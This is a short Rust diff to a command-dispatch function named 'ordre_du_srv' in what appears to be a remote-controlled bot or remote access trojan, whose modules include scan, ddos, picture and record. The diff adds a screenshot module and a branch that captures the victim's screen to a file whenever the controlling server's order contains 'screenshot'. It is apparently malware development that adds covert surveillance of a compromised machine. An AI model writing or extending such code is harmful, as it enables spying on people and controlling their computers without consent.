@@ -5,6 +5,7 @@ mod scan;
 mod ddos;
 mod picture;
 mod record;
+mod screenshot;
 
 pub(crate) fn ordre_du_srv(mut ordre: String) {
 
@@ -31,6 +32,14 @@ pub(crate) fn ordre_du_srv(mut ordre: String) {
             let ordre_clone = Arc::clone(&shared_ordre);
             let t = thread::spawn(move || {
                 record::record();
+            });
+        }
+
+        if shared_ordre.lock().unwrap().contains("screenshot") {
+            println!("Lancement de la capture d'écran");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                screenshot::screenshot("screenshot.png");
             });
         }
 
